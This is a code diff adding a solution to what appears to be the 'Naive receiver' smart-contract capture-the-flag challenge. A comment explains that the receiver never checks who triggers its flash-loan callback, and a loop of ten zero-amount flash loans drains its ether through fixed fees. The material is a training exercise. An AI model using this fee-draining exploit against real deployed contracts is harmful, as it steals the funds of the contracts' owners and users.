@@ -38,12 +38,18 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        /**
+         * for zero amount of flashloan we have to pay 1 ether as fee.
+         * In FlashLoanReceiver tehers is no check who is executing onFlashLoan funtion.
+         * Use (1st parameter address == address(flashLoanReceiver)).
+         */
         const ETH = await pool.ETH();
         for(let i=0; i<10; i++) {
             await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
         }
     });
-
+ 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
